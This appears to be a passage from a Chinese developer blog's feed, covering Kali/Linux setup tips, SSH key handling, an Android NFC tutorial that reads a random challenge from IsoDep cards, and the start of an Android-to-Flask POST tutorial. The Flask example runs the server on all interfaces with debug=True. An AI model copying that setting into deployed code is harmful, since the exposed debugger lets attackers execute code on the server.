alt="x-terminal-emulator" title="自定义快捷键"></p><h2 id="Kali更新源以及使用HTTPS更新"><a href="#Kali更新源以及使用HTTPS更新" class="headerlink" title="Kali更新源以及使用HTTPS更新"></a>Kali更新源以及使用HTTPS更新</h2><p>以当前Kali Rolling 2016.1版本为例，编辑<code>/etc/apt/sources.list</code>，替换为中科大更新源：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure><p>因为中科大更新源支持<strong>HTTPS</strong>，通过<strong>https</strong>更新需要在<strong>http</strong>更新源下安装<code>apt-transport-https</code>包，然后把更新源中的<strong>http</strong>改为<strong>https</strong>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb https://mirrors.ustc.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/kali kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure><p>PS：使用HTTPS更新再也不用怕ISP的缓存劫持了！</p><h2 id="Debian-Kali中图形化安装deb的工具GDebi"><a href="#Debian-Kali中图形化安装deb的工具GDebi" class="headerlink" title="Debian/Kali中图形化安装deb的工具GDebi"></a>Debian/Kali中图形化安装<code>deb</code>的工具<code>GDebi</code></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gdebi</span><br></pre></td></tr></table></figure><h2 id="环境变量设置"><a href="#环境变量设置" class="headerlink" title="环境变量设置"></a>环境变量设置</h2><h3 id="临时环境变量设置"><a href="#临时环境变量设置" class="headerlink" title="临时环境变量设置"></a>临时环境变量设置</h3><p>以设置<code>http_proxy</code>为例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=http://127.0.0.1:8787</span><br></pre></td></tr></table></figure><p>取消环境变量：<br><code>unset http_proxy</code>或<code>export http_proxy=</code></p><h3 id="用户级环境变量配置文件"><a href="#用户级环境变量配置文件" class="headerlink" title="用户级环境变量配置文件"></a>用户级环境变量配置文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">~/.pam_environment</span><br><span class="line">~/.profile</span><br><span class="line">~/.bashrc</span><br><span class="line">~/.bash_profile</span><br><span class="line">~/.bash_login</span><br></pre></td></tr></table></figure><h3 id="系统级环境变量配置文件"><a href="#系统级环境变量配置文件" class="headerlink" title="系统级环境变量配置文件"></a>系统级环境变量配置文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/etc/environment</span><br><span class="line">/etc/profile.d/*.sh</span><br><span class="line">/etc/profile</span><br><span class="line">/etc/profile.d/*</span><br><span class="line">/etc/default/locale</span><br><span class="line">/etc/bash.bashrc</span><br></pre></td></tr></table></figure><p>更多参考<a href="https://help.ubuntu.com/community/EnvironmentVariables" target="_blank" rel="noopener">help.ubuntu.com</a></p><h2 id="SSH的使用"><a href="#SSH的使用" class="headerlink" title="SSH的使用"></a>SSH的使用</h2><p>生成rsa公私钥对之前判断文件是否存在：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure><p>ssh-keygen生成rsa公私钥对：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">"yourname@domain.com"</span></span><br></pre></td></tr></table></figure><p>显示rsa公钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure><p>复制到剪贴板（需安装<code>xclip</code>）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xclip -sel clip &lt; ~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;常用技巧&quot;&gt;&lt;a href=&quot;#常用技巧&quot; class=&quot;headerlink&quot; title=&quot;常用技巧&quot;&gt;&lt;/a&gt;常用技巧&lt;/h2&gt;&lt;p&gt;&lt;code&gt;ps -aux&lt;/code&gt;查看进程。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;netstat -tln&lt;/code&gt;查看网络
      
    
    </summary>
    
      <category term="Tips" scheme="https://g2ex.top/categories/Tips/"/>
    
    
      <category term="Linux" scheme="https://g2ex.top/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>域名更新</title>
    <link href="https://g2ex.top/2016/03/15/Domain-Name-Updated/"/>
    <id>https://g2ex.top/2016/03/15/Domain-Name-Updated/</id>
    <published>2016-03-15T23:21:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<p>本应还有两个月才过期的博客域名<code>g2ex.me</code>被GoDaddy Removed了。移除得莫名其妙。</p><p>个人精力有限，博客输出很低，更何况好文更是寥寥无几。几年下来访问量少得可怜，只有自己偶尔回过头来翻翻，真就没有申请单独域名的必要了。</p><p>这几年辗转几个阵地，最后到Github Pages，由又Jekyll转到Hexo。再后来申请了域名，<code>g2ex.info</code>用了两年，<code>g2ex.me</code>用了一年。如今Github Pages二级域名已经原生地支持HTTPS了，这也让我决定不再申请个人域名。</p><p>以此纪念过去的<code>g2ex.info</code>和<code>g2ex.me</code>。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本应还有两个月才过期的博客域名&lt;code&gt;g2ex.me&lt;/code&gt;被GoDaddy Removed了。移除得莫名其妙。&lt;/p&gt;
&lt;p&gt;个人精力有限，博客输出很低，更何况好文更是寥寥无几。几年下来访问量少得可怜，只有自己偶尔回过头来翻翻，真就没有申请单独域名的必要了。&lt;/
      
    
    </summary>
    
    
      <category term="g2ex" scheme="https://g2ex.top/tags/g2ex/"/>
    
  </entry>
  
  <entry>
    <title>Android NFC 开发简介与示例</title>
    <link href="https://g2ex.top/2016/02/18/Android-NFC-Program/"/>
    <id>https://g2ex.top/2016/02/18/Android-NFC-Program/</id>
    <published>2016-02-18T18:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<p>本文总结Android NFC开发的一般过程，最开始介绍几个概念，然后介绍NFC事件的调度过程，最后通过示例代码说明如何进行NFC开发。至于Android NFC P2P模式开发、模拟卡开发请阅读赵波编著的《Android NFC开发实战详解》。</p><h2 id="一、Android-NFC-开发中的几个类"><a href="#一、Android-NFC-开发中的几个类" class="headerlink" title="一、Android NFC 开发中的几个类"></a>一、Android NFC 开发中的几个类</h2><p><code>NfcManager</code>：用来管理Android设备中所有NFC Adapter。因为大部分Android设备只支持一个NFC Adapter，因此可以直接使用getDefaultAdapter来获取系统的NfcAdapter。</p><p><code>NfcAdapter</code>：手机的NFC硬件设备，更专业的称呼是NFC适配器。该类可以用来定义一个Intent使系统在检测到NFC Tag时通知用户定义的Activity，并提供用来注册Foreground Tag消息发送的方法等。如果不清楚<code>Tag</code>和<code>Foreground</code>是什么，请继续往下看。</p><p><code>Tag</code>：代表一个被动式NFC对象，比如一张公交卡，Tag可以理解成能被手机NFC读写的对象。当Android检测到一个Tag时，会创建一个Tag对象，将其放在Intent对象中，然后发送到相应的Activity。</p><p><code>IsoDep</code>：该类位于<code>android.nfc.tech.IsoDep</code>包中，是支持ISO-DEP（ISO 14443-4）协议Tag的操作类。NFC协议众多，其他的协议就要用到其他类了。常见的还有：</p><ul><li><code>MifareClassic</code>类：支持Mifare Classic协议</li><li><code>MifareUltralight</code>类：支持Mifare Ultralight协议</li><li><code>Ndef</code>类和<code>NdefFormatable</code>类：支持NDEF格式</li><li><code>NfcA</code>类：支持NFC-A（ISO-14443-3A）协议</li><li><code>NfcB</code>类：支持NFC-B（ISO-14443-3B）协议</li><li><code>NfcF</code>类：支持NFC-F（JIS 6319-4）协议</li><li><code>NfcV</code>类：支持NFC-V（ISO 15693）协议</li><li>等等</li></ul><h2 id="二、NFC调度系统"><a href="#二、NFC调度系统" class="headerlink" title="二、NFC调度系统"></a>二、NFC调度系统</h2><p>NFC调度是指手机检测到NFC对象后如何处理，调度系统分为前台调度系统（Foreground Dispatch System）和标签调度系统（NFC Tag Dispatch System）。</p><h3 id="1-前台调度系统"><a href="#1-前台调度系统" class="headerlink" title="1) 前台调度系统"></a>1) 前台调度系统</h3><p>NFC前台调度系统是一种用于在运行的程序中（前台呈现的Activity）处理Tag的技术，即前台调度系统允许Activity拦截Intent对象，并且声明该Activity的优先级比其他的处理Intent对象的Activity高。前台调度系统在一些涉及需要在前台呈现的页面中直接获取或推送NFC信息时十分方便。本文的示例就是使用前台调度。</p><p>前台调度的使用方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个PendingIntent对象，以便Android系统能够在扫描到NFC标签时，用它来封装NFC标签的详细信息</span></span><br><span class="line">PendingIntent pendingIntent = PendingIntent.getActivity(<span class="keyword">this</span>, <span class="number">0</span>, <span class="keyword">new</span> Intent(<span class="keyword">this</span>, getClass()).addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建Intent过滤器</span></span><br><span class="line">IntentFilter iso = <span class="keyword">new</span> IntentFilter(NfcAdapter.ACTION_TECH_DISCOVERED);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个处理NFC标签技术的数组</span></span><br><span class="line">String[][] techLists = <span class="keyword">new</span> String[][]&#123;<span class="keyword">new</span> String[]&#123;IsoDep<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()&#125;&#125;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在主线程中调用enableForegroundDispatch()方法，一旦NFC标签接触到手机，这个方法就会被激活</span></span><br><span class="line">adapter.enableForegroundDispatch(<span class="keyword">this</span>, pendingIntent, <span class="keyword">new</span> IntentFilter[]&#123;iso&#125;, techLists);</span><br></pre></td></tr></table></figure><h3 id="2-标签调度系统"><a href="#2-标签调度系统" class="headerlink" title="2) 标签调度系统"></a>2) 标签调度系统</h3><p>NFC标签调度系统是一种通过预先定义好的Tag或NDEF消息来启动应用程序的机制，当扫描到一个NFC Tag时，如果Intent中注册对应的App，那么在处理该Tag信息时就会启动该App。当存在多个可以处理该Tag信息的Apps时，系统会弹出一个Activity Choose，供用户选择开启哪个应用。标签调度系统定义了3种Intent对象，按照优先级由高到低分别为<code>ACTION_NDEF_DISCOVERED</code>、<code>ACTION_TECH_DISCOVERED</code>、<code>ACTION_TAB_DISCOVERED</code>。</p><p>标签调度的基本工作方法如下：</p><ul><li>用解析NFC标签时由标签调度系统创建的Intent对象（<code>ACTION_NDEF_DISCOVERED</code>）来尝试启动Activity。</li><li>如果没有对应的处理Intent的Activity，就会尝试使用下一个优先级的Intent（<code>ACTION_TECH_DISCOVERED</code>，继而<code>ACTION_TAG_DISCOVERED</code>）来启动Activity，直到有对应的App来处理这个Intent，或者是直接标签调度系统尝试了所有可能的Intent。</li><li>如果没有应用程序来处理任何类型的Intent，就不做任何事情。</li></ul><h2 id="三、Android-NFC-编程示例"><a href="#三、Android-NFC-编程示例" class="headerlink" title="三、Android NFC 编程示例"></a>三、Android NFC 编程示例</h2><p>一般的非接触智能卡如公交卡都支持取随机数命令，该示例实现通过NFC获取随机数的功能。操作智能卡的NFC协议使用<code>IsoDep</code>。</p><p>示例主要有两个类，与NFC对象的交互类<code>NFC.java</code>，处理NFC调度的<code>MainActivity.java</code>。源码在文章最后可以下载。</p><h3 id="1-编写与NFC对象的交互类"><a href="#1-编写与NFC对象的交互类" class="headerlink" title="1) 编写与NFC对象的交互类"></a>1) 编写与NFC对象的交互类</h3><p>最开始，我们需要定义自己的<code>NFC类</code>，在该类中定义获取随机数的APDU命令，在构造函数中初始化ISO-DEP协议的Tag操作类实例，在<code>send()</code>方法中发送和接收APDU。<code>NFC类</code>实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NFC</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取随机数的APDU命令</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] GET_RANDOM = &#123;<span class="number">0x00</span>, (<span class="keyword">byte</span>)<span class="number">0x84</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明ISO-DEP协议的Tag操作实例</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> IsoDep tag;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">NFC</span><span class="params">(IsoDep tag)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">// 初始化ISO-DEP协议的Tag操作类实例</span></span><br><span class="line">        <span class="keyword">this</span>.tag = tag;</span><br><span class="line">        tag.setTimeout(<span class="number">5000</span>);</span><br><span class="line">        tag.connect();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 向Tag发送获取随机数的APDU并返回Tag响应</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 十六进制随机数字符串</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> APDUError</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">send</span><span class="params">()</span> <span class="keyword">throws</span> IOException, APDUError </span>&#123;</span><br><span class="line">        <span class="comment">// 发送APDU命令</span></span><br><span class="line">        <span class="keyword">byte</span>[] resp = tag.transceive(GET_RANDOM);</span><br><span class="line">        String strResp =  <span class="keyword">new</span> String(Hex.encodeHex(resp));</span><br><span class="line">        Log.d(<span class="string">"REQ "</span>, <span class="keyword">new</span> String(Hex.encodeHex(GET_RANDOM)));</span><br><span class="line">        Log.d(<span class="string">"RESP"</span>, <span class="keyword">new</span> String(Hex.encodeHex(resp)));</span><br><span class="line">        <span class="comment">// 获取NFC Tag返回的状态值</span></span><br><span class="line">        <span class="keyword">int</span> status = ((<span class="number">0xff</span> &amp; resp[resp.length - <span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) | (<span class="number">0xff</span> &amp; resp[resp.length - <span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">if</span> (status != <span class="number">0x9000</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APDUError(status);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> strResp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-NFC调度的实现"><a href="#2-NFC调度的实现" class="headerlink" title="2) NFC调度的实现"></a>2) NFC调度的实现</h3><p>在MainActivity中编写以下代码。</p><p>① 获取NfcAdapter，可以在onCreate()方法中实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adapter = NfcAdapter.getDefaultAdapter(getApplicationContext());</span><br></pre></td></tr></table></figure><p>② 构造PendingInent对象封装NFC标签信息，②-⑤步骤都可以在onResume()方法中实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PendingIntent pendingIntent = PendingIntent.getActivity(<span class="keyword">this</span>, <span class="number">0</span>,</span><br><span class="line">                <span class="keyword">new</span> Intent(<span class="keyword">this</span>, getClass()).addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP), <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>③ 声明Intent对象的过滤器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IntentFilter iso = <span class="keyword">new</span> IntentFilter(NfcAdapter.ACTION_TECH_DISCOVERED);</span><br></pre></td></tr></table></figure><p>④ 建立一个处理NFC标签技术的数组。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String[][] techLists = <span class="keyword">new</span> String[][]&#123;<span class="keyword">new</span> String[]&#123;IsoDep<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()&#125;&#125;</span>;</span><br></pre></td></tr></table></figure><p>⑤ 调用enableForegroundDispatch()方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adapter.enableForegroundDispatch(<span class="keyword">this</span>, pendingIntent, <span class="keyword">new</span> IntentFilter[]&#123;iso&#125;, techLists);</span><br></pre></td></tr></table></figure><p>⑥ 在onPause()方法中调用disableForegroundDispatch()方法当Activity挂起时禁用前台调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adapter.disableForegroundDispatch(<span class="keyword">this</span>);</span><br></pre></td></tr></table></figure><p>⑦ 最后在onNewIntent()方法中处理Intent回调给我们的信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onNewIntent</span><span class="params">(Intent intent)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onNewIntent(intent);</span><br><span class="line">    Tag tag = intent.getParcelableExtra(NfcAdapter.EXTRA_TAG);</span><br><span class="line">    <span class="keyword">if</span>(tag != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            NFC nfc = <span class="keyword">new</span> NFC(IsoDep.get(tag));</span><br><span class="line">            <span class="comment">// 发送取随机数APDU命令</span></span><br><span class="line">            String resp = nfc.send();</span><br><span class="line">            <span class="comment">// TextView中显示APDU响应</span></span><br><span class="line">            ((TextView) findViewById(R.id.result)).setText(resp);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (APDUError apduError) &#123;</span><br><span class="line">            Toast.makeText(getApplicationContext(), apduError.getMessage(), Toast.LENGTH_LONG).show();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            findViewById(R.id.progressBar).setVisibility(View.INVISIBLE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="四、源码下载"><a href="#四、源码下载" class="headerlink" title="四、源码下载"></a>四、源码下载</h2><p>程序在Android Studio 1.5.1中编写并测试通过。源码链接： <a href="http://pan.baidu.com/s/1hrjprZQ" target="_blank" rel="noopener">http://pan.baidu.com/s/1hrjprZQ</a> 密码: 29tb</p><h2 id="五、参考内容"><a href="#五、参考内容" class="headerlink" title="五、参考内容"></a>五、参考内容</h2><ol><li>《Android NFC开发实战详解》赵波 第四章</li><li><a href="http://www.jianshu.com/p/7991dc02b0d8" target="_blank" rel="noopener">http://www.jianshu.com/p/7991dc02b0d8</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文总结Android NFC开发的一般过程，最开始介绍几个概念，然后介绍NFC事件的调度过程，最后通过示例代码说明如何进行NFC开发。至于Android NFC P2P模式开发、模拟卡开发请阅读赵波编著的《Android NFC开发实战详解》。&lt;/p&gt;
&lt;h2 id=&quot;一
      
    
    </summary>
    
    
      <category term="Android" scheme="https://g2ex.top/tags/Android/"/>
    
      <category term="NFC" scheme="https://g2ex.top/tags/NFC/"/>
    
  </entry>
  
  <entry>
    <title>Android App与Flask通信实例：POST数据的发送与处理</title>
    <link href="https://g2ex.top/2015/11/19/Post-from-Android-App-to-Flask-Server/"/>
    <id>https://g2ex.top/2015/11/19/Post-from-Android-App-to-Flask-Server/</id>
    <published>2015-11-19T23:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、说明"><a href="#一、说明" class="headerlink" title="一、说明"></a>一、说明</h2><p>在Android开发中，当应用需要向服务器提交数据数据时，可以使用POST方式向服务器提交form表单。服务器端框架有多种选择，快速开发可以使用Python的Flask框架。本文介绍了在服务器端如何使用Flask框架处理客户端发送的POST请求，以及在Android App中如何向服务器发送POST请求。</p><blockquote><p>实验环境<br>服务器：Ubuntu 14.04 x64, IP地址: 10.10.10.128<br>Android IDE：Android Studio 1.4.1<br>辅助测试工具：Chrome应用<code>Postman</code></p></blockquote><p>本文中，Android客户端使用POST的方式向服务器提交form表单。我们假设需要提交的form表单只有两个字段，分别是<code>uid=&quot;001&quot;</code>和<code>name=&quot;g2ex&quot;</code>。</p><p>接下来，我们先编写服务器端Flask应用，接收客户端发送的POST数据，解析出这两个参数的内容，并向客户端返回确认信息<code>OK.</code>。然后再在Android Studio中编写客户端App实现POST提交数据的过程。</p><h2 id="二、服务器端开发"><a href="#二、服务器端开发" class="headerlink" title="二、服务器端开发"></a>二、服务器端开发</h2><p>本文中，服务器端使用Python的Flask框架。想要快速了解Flask，可以参考<a href="http://docs.jinkan.org/docs/flask/" title="Flask中文开发文档" target="_blank" rel="noopener">Flask中文开发文档</a>。Flask的安装请参考<a href="http://docs.jinkan.org/docs/flask/installation.html" title="安装Flask" target="_blank" rel="noopener">Flask安装说明</a>。</p><h3 id="1-编写一个简单的Flask应用"><a href="#1-编写一个简单的Flask应用" class="headerlink" title="1) 编写一个简单的Flask应用"></a>1) 编写一个简单的Flask应用</h3><p>使用Flask处理客户端的POST请求非常简单，我们创建一个项目目录<code>flaskr</code>，在目录下创建一个名为<code>myapp.py</code>的文件，写入如下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line"><span class="comment"># create the application object</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">()</span>:</span></span><br><span class="line">    uid = request.form[<span class="string">'uid'</span>]</span><br><span class="line">    name =  request.form[<span class="string">'name'</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'uid: %s, name: %s'</span> % (uid, name)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'OK.'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>使用下面的命令启动Flask，默认在本机的<code>5000</code>端口上监听来自所有网络的POST请求。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python myapp.py</span><br></pre></td></tr></table></figure><h3 id="2-简单测试Flask"><a href="#2-简单测试Flask" class="headerlink" title="2) 简单测试Flask"></a>2) 简单测试Flask</h3><p>在Chrome浏览器<code>chrome://apps</code>中打开<code>Postman</code>应用。类型选择<code>POST</code>，服务器地址中输入<code>http://10.10.10.128:5000</code>，<code>Body</code>中勾选<code>x-www-form-urlencoded</code>，并在下面的<code>Key-Value</code>中输入我们要提交的内容。点击<code>Send</code>可以看到服务器返回的<code>OK.</code>，说明我们编写的Flask应用可以处理POST请求。如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2015-11-18_221835.webp" alt="Postman POST测试" title="Postman POST测试"></p><p>此时，在服务器端的Terminal中，可以看到打印出来的记录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uid: 001, name: g2ex</span><br><span class="line">10.10.10.1 - - [18/Nov/2015 22:52:25] <span class="string">"POST / HTTP/1.1"</span> 200 -</span><br></pre></td></tr></table></figure><h2 id="三、Android客户端开发"><a href="#三、Android客户端开发" class="headerlink" title="三、Android客户端开发"></a>三、Android客户端开发</h2><p>本文中，Android客户端使用POST的方式向服务器提交form数据，可以编写<code>HttpUtils</code>类实现这个功能，<code>HttpUtils</code>类中使用了标准Java接口<code>HttpURLConnection</code>。</p><p>首先，使用Android Studio创建一个名为<code>PostTest</code>的项目，在布局文件<code>activity_main.xml</code>中创建一个id为<code>button_send</code>的按钮。</p><p>在<code>MainActivity</code>中的<code>onCreate()</code>中添加按钮监听事件，按钮点击后调用<code>postData()</code>，<code>postData()</code>启动线程使用<code>HttpUtils</code>类的静态方法<code>submitPostData()</code>向服务器POST数据。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* MainActivity.java */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Button mButton_send;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">    mButton_send = (Button)findViewById(R.id.button_send);</span><br><span class="line">    mButton_send.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">            postData();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">postData</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            Map&lt;String, 